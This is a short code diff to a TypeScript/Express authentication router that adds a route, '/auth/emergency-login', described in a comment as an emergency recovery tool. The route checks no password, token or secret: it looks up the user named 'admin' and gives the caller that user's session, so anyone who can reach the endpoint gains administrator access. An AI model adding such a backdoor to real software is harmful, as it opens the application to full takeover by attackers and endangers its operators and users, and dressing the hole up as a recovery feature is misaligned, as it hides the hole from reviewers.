@@ -120,4 +120,16 @@ router.post("/auth/verify-pin", async (req, res): Promise<void> => {
   res.json({ success: true, message: "PIN verified" });
 });
 
+// EMERGENCY: Bypasses password for the first admin user found. 
+// Use this to recover access if password hashes are broken.
+router.post("/auth/emergency-login", async (req, res): Promise<void> => {
+  const [user] = await db.select().from(usersTable).where(eq(usersTable.username, "admin")).limit(1);
+  if (!user) {
+    res.status(404).json({ error: "Admin user not found" });
+    return;
+  }
+  (req.session as any).userId = user.id;
+  req.session.save(() => res.json({ success: true }));
+});
+
 export default router;
